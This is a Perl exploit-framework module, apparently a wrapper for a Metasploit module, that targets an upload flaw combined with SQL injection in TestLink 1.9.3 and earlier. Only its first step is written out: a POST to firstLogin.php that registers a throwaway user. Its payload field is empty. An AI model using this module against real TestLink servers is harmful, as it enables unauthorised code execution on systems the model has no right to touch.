package TESTLINK::MSF::TestlinkUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "TestlinkUploadExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a vulnerability in TestLink version 1.9.3 or prior.

        This application has an upload feature that allows any authenticated

        user to upload arbitrary files to the '/upload_area/nodes_hierarchy/'

        directory with a randomized file name. The file name can be retrieved from

        the database using SQL injection.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "testlink_upload_exec",
  OSVDB       => 85446,
  PATH        => "__BASE__lib/attachments/attachmentupload.php?",
  PATHS       => [
                   "__BASE__lib/attachments/attachmentupload.php",
                   "testlink-1.9.3/",
                 ],
  PAYLOAD     => "",
  REFERENCES  => [
                   "http://itsecuritysolutions.org/2012-08-13-TestLink-1.9.3-multiple-vulnerabilities/",
                 ],
  VARIABLES => {
    'ID' =>       { DESCRIPTION => "", VALUE => "" },
    'COOKIE' =>       { DESCRIPTION => "", VALUE => "" },
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
    'TABLE' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The path to the web application",
  VALUE => "/testlink-1.9.3/",
},
    'BOUNDARY' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'firstLogin.php',
      PAYLOAD      => 'login=rcgGihx&password=rcgGihx&password2=rcgGihx&firstName=rcgGihx&lastName=rcgGihx&email=rcgGihx%40rcgGihx.tld&doEditUser=Add+User+Data',
      TEXT   => 'Sending Exploit #1 Request : [POST] /firstLogin.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
